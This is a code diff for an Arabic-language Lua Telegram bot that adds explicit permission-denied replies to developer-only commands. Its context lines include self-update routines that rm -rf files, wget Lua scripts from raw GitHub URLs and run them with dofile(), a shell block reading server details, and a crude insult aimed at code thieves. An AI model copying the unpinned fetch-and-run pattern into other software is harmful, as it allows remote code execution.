@@ -1079,7 +1079,11 @@ end,nil)
 end,nil)
 end,nil)
 end 
-if text == 'تفعيل التواصل ☉' and DevSoFi(msg) then  
+if text == 'تفعيل التواصل ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if database:get(bot_id..'Tuasl:Bots') then
 database:del(bot_id..'Tuasl:Bots') 
 Text = '\n ☉┇ تم تفعيل التواصل ' 
@@ -1088,7 +1092,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل التواصل '
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل التواصل ☉' and DevSoFi(msg) then  
+if text == 'تعطيل التواصل ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Tuasl:Bots') then
 database:set(bot_id..'Tuasl:Bots',true) 
 Text = '\n ☉┇ تم تعطيل التواصل' 
@@ -1097,7 +1105,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل التواصل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل البوت الخدمي ☉' and DevSoFi(msg) then  
+if text == 'تفعيل البوت الخدمي ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if database:get(bot_id..'Free:Bots') then
 database:del(bot_id..'Free:Bots') 
 Text = '\n ☉┇ تم تفعيل البوت الخدمي ' 
@@ -1106,7 +1118,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل البوت الخدمي '
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل البوت الخدمي ☉' and DevSoFi(msg) then  
+if text == 'تعطيل البوت الخدمي ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Free:Bots') then
 database:set(bot_id..'Free:Bots',true) 
 Text = '\n ☉┇ تم تعطيل البوت الخدمي' 
@@ -1126,12 +1142,20 @@ send(msg.chat_id_, msg.id_,' ☉┇ تم حفظ كليشه ستارت')
 database:del(bot_id..'Start:Bots') 
 return false
 end
-if text == 'ضع كليشه ستارت ☉' and DevSoFi(msg) then 
+if text == 'ضع كليشه ستارت ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'Start:Bots',true) 
 send(msg.chat_id_, msg.id_,' ☉┇ ارسل لي الكليشه الان')
 return false
 end
-if text == ("المدراء العامين ☉") and Sudo(msg) then
+if text == ("المدراء العامين ☉") then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id.."Gmanager")
 t = "\n☉┇ قائمة المدراء في البوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -1147,15 +1171,27 @@ t = "☉┇ لا يوجد مدراء عامين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("مسح المدراء العامين ☉") and Sudo(msg) then
+if text == ("مسح المدراء العامين ☉") then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id.."Gmanager")
 send(msg.chat_id_, msg.id_, "\n☉┇ تم مسح قائمة المدراء العامين  ")
 end
-if text == 'مسح كليشه ستارت ☉' and DevSoFi(msg) then 
+if text == 'مسح كليشه ستارت ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'Start:Bot') 
 send(msg.chat_id_, msg.id_,' ☉┇ تم مسح كليشه ستارت')
 end
-if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' and DevSoFi(msg) then    
+if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
 end 
@@ -1206,7 +1242,11 @@ end
 database:set(bot_id.."botss:DRAGON:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_,"☉┇ارسل الان الكلمه لمسحها ")
 end
-if text == 'اضف رد عام ☉' and DevSoFi(msg) then 
+if text == 'اضف رد عام ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -1220,7 +1260,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ ارسل الكلمه تريد اضافته�
 database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
 return false 
 end
-if text == ("مسح الردود العامه ☉") and DevSoFi(msg) then 
+if text == ("مسح الردود العامه ☉") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 local list = database:smembers(bot_id..'List:Rd:Sudo')
 for k,v in pairs(list) do
 database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
@@ -1235,7 +1279,11 @@ database:del(bot_id..'List:Rd:Sudo')
 end
 send(msg.chat_id_, msg.id_," ☉┇ تم مسح الردود العامه")
 end
-if text == ("الادمنيه العامين ☉") and Sudo(msg) then
+if text == ("الادمنيه العامين ☉") then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id.."Gmod:User")
 t = "\n☉┇ قائمة الادمنيه في البوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -1251,11 +1299,19 @@ t = "☉┇ لا يوجد ادمنيه عامين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("مسح الادمنيه العامين ☉") and Sudo(msg) then
+if text == ("مسح الادمنيه العامين ☉") then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id.."Gmod:User")
 send(msg.chat_id_, msg.id_, "\n☉┇ تم مسح قائمة الادمنيه العامين  ")
 end
-if text == ("الردود العامه ☉") and DevSoFi(msg) then 
+if text == ("الردود العامه ☉") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 local list = database:smembers(bot_id..'List:Rd:Sudo')
 text = "\n ☉┇ قائمة الردود العامه \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -1283,7 +1339,11 @@ text = " ☉┇ لا يوجد ردود عامه"
 end
 send(msg.chat_id_, msg.id_,'['..text..']')
 end
-if text == 'مسح رد عام ☉' and DevSoFi(msg) then 
+if text == 'مسح رد عام ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -1297,7 +1357,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ ارسل الكلمه تريد مسحها')
 database:set(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_,true)
 return false 
 end
-if text == 'معلومات السيرفر ☉' or text == 'السيرفر' and DevSoFi(msg) then 
+if text == 'معلومات السيرفر ☉' or text == 'السيرفر' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 send(msg.chat_id_, msg.id_, io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
@@ -1313,7 +1377,11 @@ echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخـ
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n*»» '"$uptime"'*'
 ]]):read('*all'))  
 end
-if text == 'جلب المشتركين ☉' and DevSoFi(msg) then---- الكود كتابه أحمد عياد تسرق هنيكك
+if text == 'جلب المشتركين ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end---- الكود كتابه أحمد عياد تسرق هنيكك
 local list = database:smembers(bot_id..'User_Bot')
 local t = '{"users":['  
 for k,v in pairs(list) do
@@ -1402,7 +1470,11 @@ if text == '☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉' then
 send(msg.chat_id_,msg.id_, ' اختر من الاوامر بلكيبورد ') 
 return false
 end
-if text == ("مسح المطورين الثانين ☉") and SudoBot(msg) then
+if text == ("مسح المطورين الثانين ☉") then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id.."Dev:SoFi:2")
 send(msg.chat_id_, msg.id_, "\n☉┇ تم مسح قائمة المطورين الثانين  ")
 end
@@ -1508,7 +1580,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == ("المطورين الثانين ☉") and Sudo(msg) then
+if text == ("المطورين الثانين ☉") then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id.."Dev:SoFi:2")
 t = "\n☉┇ قائمة مطورين الثانين للبوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -1524,7 +1600,11 @@ t = "☉┇ لا يوجد مطورين ثانيين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == 'تحديث المتجر ☉' and DevSoFi(msg) then  
+if text == 'تحديث المتجر ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 os.execute("rm -fr File_Bot/*")
 os.execute("mkdir File_Bot")
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
@@ -1534,7 +1614,11 @@ dofile('File_Bot/anamen.lua')
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث المتجر و مسح الملفات')
 end
 --[[
-if text == 'تغير المطور الاساسي' and SudoBot(msg) then
+if text == 'تغير المطور الاساسي' then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 database:set(bot_id..'Set:Text:Dev:Bot:id'..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_,' ارسل الان معرف المطور الاساسي الجديد')
 return false
@@ -1625,7 +1709,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false 
 end
-if text == 'تحديث السورس' or text == 'تحديث السورس ☉' or text == 'تحديث' and DevSoFi(msg) then 
+if text == 'تحديث السورس' or text == 'تحديث السورس ☉' or text == 'تحديث' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
@@ -2816,37 +2904,61 @@ local Text_Rand = List[math.random(#List)]
 database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
 send(msg.chat_id_, msg.id_,'☉┇ تم تغير الايدي ارسل ايدي لرؤيته')
 end
-if text == "ضع اسم للبوت ☉" and DevSoFi(msg) then  
+if text == "ضع اسم للبوت ☉" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل اليه الاسم الان ")
 return false
 end
-if text == 'الاحصائيات ☉' and DevSoFi(msg) then 
+if text == 'الاحصائيات ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = ' الاحصائيات ☉ \n'..' ☉┇ عدد الجروبات » {`'..Groups..'`}'..'\n ☉┇  عدد المشتركين » {`'..Users..'`}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == 'المشتركين ☉' and DevSoFi(msg) then 
+if text == 'المشتركين ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = '\n ☉┇ المشتركين»{`'..Users..'`}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == 'الجروبات ☉' and DevSoFi(msg) then 
+if text == 'الجروبات ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = '\n ☉┇ الجروبات»{`'..Groups..'`}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == ("مسح المطورين الثالثين ☉") and DevSoFi(msg) then
+if text == ("مسح المطورين الثالثين ☉") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Sudo:User')
 send(msg.chat_id_, msg.id_, "\n ☉┇ تم مسح قائمة المطورين الثالثين ")
 end
-if text == ("المطورين الثالثين ☉") and Sudo(msg) then
+if text == ("المطورين الثالثين ☉") then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Sudo:User')
 t = "\n ☉┇ قائمة المطورين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -2862,12 +2974,20 @@ t = " ☉┇ لا يوجد مطورين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("مسح الحظر العام ☉") and DevSoFi(msg) then
+if text == ("مسح الحظر العام ☉") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'GBan:User')
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم مسح قائمه الحظر العام')
 return false
 end
-if text == ("قائمه الحظر العام ☉") and DevSoFi(msg) then
+if text == ("قائمه الحظر العام ☉") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'GBan:User')
 t = "\n ☉┇ قائمه المحظورين عام \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -2884,12 +3004,20 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("مسح الكتم العام ☉") and DevSoFi(msg) then
+if text == ("مسح الكتم العام ☉") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Gmute:User')
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم مسح قائمه الكتم العام')
 return false
 end
-if text == ("قائمه الكتم العام ☉") and DevSoFi(msg) then
+if text == ("قائمه الكتم العام ☉") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Gmute:User')
 t = "\n ☉┇ قائمة المكتومين عام \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -2906,35 +3034,63 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text=="اذاعه خاص ☉" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
+if text=="اذاعه خاص ☉" and msg.reply_to_message_id_ == 0 then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك؟ \n ☉┇ للخروج ارسل الغاء ")
 return false
 end 
-if text=="اذاعه ☉" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
+if text=="اذاعه ☉" and msg.reply_to_message_id_ == 0 then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك؟ \n ☉┇ للخروج ارسل الغاء ")
 return false
 end  
-if text=="اذاعه بالتثبيت ☉" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
+if text=="اذاعه بالتثبيت ☉" and msg.reply_to_message_id_ == 0 then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك؟ \n ☉┇ للخروج ارسل الغاء ")
 return false
 end 
-if text=="اذاعه بالتوجيه ☉" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
+if text=="اذاعه بالتوجيه ☉" and msg.reply_to_message_id_ == 0  then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان")
 return false
 end 
-if text=="اذاعه بالتوجيه خاص ☉" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
+if text=="اذاعه بالتوجيه خاص ☉" and msg.reply_to_message_id_ == 0  then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان")
 return false
 end 
-if text == 'جلب نسخه الاحتياطيه ☉' and DevSoFi(msg) then 
+if text == 'جلب نسخه الاحتياطيه ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 GetFile_Bot(msg)
 end
-if text == "مسح المشتركين" and DevSoFi(msg) then 
+if text == "مسح المشتركين" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -2970,7 +3126,11 @@ end,nil)
 end
 return false
 end
-if text == "مسح الجروبات ☉" and DevSoFi(msg) then 
+if text == "مسح الجروبات ☉" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -3891,7 +4051,11 @@ end
 end
 end
 
-if text == 'تفعيل' and Sudo(msg) then
+if text == 'تفعيل' then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -4061,7 +4225,11 @@ database:set(bot_id..'Num:Add:Bot',Num)
 send(msg.chat_id_, msg.id_,' ☉┇ تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
 end
 
-if text == 'تحديث السورس' or text == 'تحديث' and DevSoFi(msg) then 
+if text == 'تحديث السورس' or text == 'تحديث' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
@@ -4071,7 +4239,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لد�
 dofile('DRAGON.lua')
 end
 
-if text == 'تحديث المتجر' and DevSoFi(msg) then  
+if text == 'تحديث المتجر' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 os.execute("rm -fr File_Bot/*")
 os.execute("mkdir File_Bot")
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
@@ -4081,27 +4253,47 @@ dofile('File_Bot/anamen.lua')
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث المتجر و مسح الملفات')
 end
 
-if text and text:match("^تغير الاشتراك$") and DevSoFi(msg) then  
+if text and text:match("^تغير الاشتراك$") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ حسنآ ارسل لي معرف القناة')
 return false  
 end
-if text and text:match("^تغير رساله الاشتراك$") and DevSoFi(msg) then  
+if text and text:match("^تغير رساله الاشتراك$") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ حسنآ ارسل لي النص الذي تريده')
 return false  
 end
-if text == "مسح رساله الاشتراك ☉" and DevSoFi(msg) then  
+if text == "مسح رساله الاشتراك ☉" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 database:del(bot_id..'text:ch:user')
 send(msg.chat_id_, msg.id_, " ☉┇ تم مسح رساله الاشتراك ")
 return false  
 end
-if text and text:match("^وضع قناة الاشتراك ☉$") and DevSoFi(msg) then  
+if text and text:match("^وضع قناة الاشتراك ☉$") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ حسنآ ارسل لي معرف القناة')
 return false  
 end
-if text == "تفعيل الاشتراك الاجباري ☉" and DevSoFi(msg) then  
+if text == "تفعيل الاشتراك الاجباري ☉" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if database:get(bot_id..'add:ch:id') then
 local addchusername = database:get(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_," ☉┇ الاشتراك الاجباري مفعل \n ☉┇ على القناة » ["..addchusername.."]")
@@ -4111,13 +4303,21 @@ send(msg.chat_id_, msg.id_," ☉┇ اهلا عزيزي المطور \n ☉┇ �
 end
 return false  
 end
-if text == "تعطيل الاشتراك الاجباري ☉" and DevSoFi(msg) then  
+if text == "تعطيل الاشتراك الاجباري ☉" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 database:del(bot_id..'add:ch:id')
 database:del(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_, " ☉┇ تم تعطيل الاشتراك الاجباري ")
 return false  
 end
-if text == "الاشتراك الاجباري ☉" and DevSoFi(msg) then  
+if text == "الاشتراك الاجباري ☉" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if database:get(bot_id..'add:ch:username') then
 local addchusername = database:get(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_, " ☉┇ تم تفعيل الاشتراك الاجباري \n ☉┇ على القناة » ["..addchusername.."]")
@@ -4126,11 +4326,19 @@ send(msg.chat_id_, msg.id_, " ☉┇ لا يوجد قناة في الاشترا�
 end
 return false  
 end
-if text == "تفعيل الاضافات" and SudoBot(msg) then
+if text == "تفعيل الاضافات" then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل الاضافات')
 database:set(bot_id.."AL:AddS0FI:stats","✔")
 end
-if text == "تعطيل الاضافات" and SudoBot(msg) then
+if text == "تعطيل الاضافات" then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل الاضافات')
 database:set(bot_id.."AL:AddS0FI:stats","✖")
 end
@@ -4424,7 +4632,11 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
-if text == 'رفع نسخه الاحتياطيه' and DevSoFi(msg) then   
+if text == 'رفع نسخه الاحتياطيه' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end   
 if tonumber(msg.reply_to_message_id_) > 0 then
 function by_reply(extra, result, success)   
 if result.content_.document_ then 
@@ -4436,7 +4648,11 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end
 end
-if text == 'رفع المشتركين' and DevSoFi(msg) then
+if text == 'رفع المشتركين' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 function by_reply(extra, result, success)   
 if result.content_.document_ then 
 local ID_FILE = result.content_.document_.document_.persistent_id_ 
@@ -4453,7 +4669,11 @@ end
 end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end
-if text == 'جلب المشتركين' and DevSoFi(msg) then---- الكود كتابه أحمد عياد كامل تسرق هنيكك
+if text == 'جلب المشتركين' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end---- الكود كتابه أحمد عياد كامل تسرق هنيكك
 local list = database:smembers(bot_id..'User_Bot')
 local t = '{"users":['  
 for k,v in pairs(list) do
@@ -4469,7 +4689,11 @@ File:write(t)
 File:close()
 sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}')
 end
-if text == 'جلب نسخه الاحتياطيه' and DevSoFi(msg) then 
+if text == 'جلب نسخه الاحتياطيه' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 GetFile_Bot(msg)
 end
 if text == 'الاوامر المضافه' and Constructor(msg) then
